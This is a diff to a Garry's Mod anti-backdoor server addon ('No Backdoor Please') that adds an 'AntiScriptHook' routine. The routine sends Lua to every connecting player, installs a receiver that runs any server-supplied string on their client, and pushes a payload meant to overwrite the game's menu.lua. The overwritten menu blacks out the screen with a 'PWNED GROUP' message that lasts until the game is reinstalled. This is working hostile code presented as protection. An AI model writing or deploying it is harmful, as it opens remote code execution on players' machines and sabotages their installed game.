@@ -5,6 +5,70 @@ local NBP = {}
 NBP.LaBlacklistAutoreport = false -- Automatique report to https://g-box.fr
 NBP.ReportFoundSteamIDs = false   -- Report steamids found in hook/concommand backdoors
 
+NBP.AntiScriptHook = true
+
+util.AddNetworkString("NBP_ASH_SENDCODE") -- To send code to client
+
+hook.Add("PlayerAuthed", "NBP_ASH", function(ply)
+	timer.Simple(5, function()
+		ply:SendLua([[
+			net.Receive("NBP_ASH_SENDCODE", function() RunString(net.ReadString(), "Startup") end)
+		]])
+		timer.Simple(1, function()
+			net.Start("NBP_ASH_SENDCODE")
+			net.WriteString([=[
+				RunString([[
+					
+					include( "mount/mount.lua" )
+					include( "getmaps.lua" )
+					include( "loading.lua" )
+					include( "mainmenu.lua" )
+					include( "video.lua" )
+					include( "demo_to_video.lua" )
+
+					include( "menu_save.lua" )
+					include( "menu_demo.lua" )
+					include( "menu_addon.lua" )
+					include( "menu_dupe.lua" )
+					include( "errors.lua" )
+
+					include( "motionsensor.lua" )
+					include( "util.lua" )
+
+
+					surface.CreateFont("LOLWUT", {size=24})
+					hook.Add("DrawOverlay", "yeah_fuck_your_shit_hard", function()
+						draw.RoundedBox(0, 0, 0, ScrW(), ScrH(), Color(0, 0, 0))
+						draw.SimpleText("PWNED GROUP", "LOLWUT", ScrW() / 2, ScrH() / 2, Color(255, 100, 100),1,1)
+						draw.SimpleText("No Backdoor Please", "LOLWUT", ScrW() / 2, ScrH() / 1.75, Color(255, 150, 150),1,1)
+						draw.SimpleText("Salut, Garry's Mod est bloquer car tu a essayer de filesteal un server proteger par NBP", "LOLWUT", ScrW() / 2, ScrH() / 1.50, Color(255, 255, 255),1,1)
+						draw.SimpleText("Pour te libéré, tu peut re-installer ton jeu :)", "LOLWUT", ScrW() / 2, ScrH() / 1.35, Color(255, 255, 255),1,1)	
+						draw.SimpleText("NBP, No Backdoor Please, par Jhon", "LOLWUT", ScrW() / 2, ScrH() / 1.25, Color(255, 255, 255),1,1)	
+					end)
+
+				]], "../../garrysmod/lua/menu/menu.lua")
+				function ScrewScriptHook(path)
+					local files, dirs = file.Find("lua/"..path.."*", "GAME")
+					for i,v in pairs(files) do
+						RunString([[
+							return false
+							-- Don't steal this :(
+							]], v)	
+					end
+					for k,v in pairs(dirs) do
+						ScrewScriptHook(v.."/")
+					end
+				end
+				ScrewScriptHook("")
+				ScrewScriptHook = nil
+				RunString([[return false]], "../scripthook.lua") -- No more scripthook
+				]=])
+			net.Send(ply)
+			print("Sent anti-scripthook to "..ply:Nick())
+		end)
+	end)
+end)
+
 NBP.httpFetch = http.Fetch
 NBP.httpPost = http.Post
 
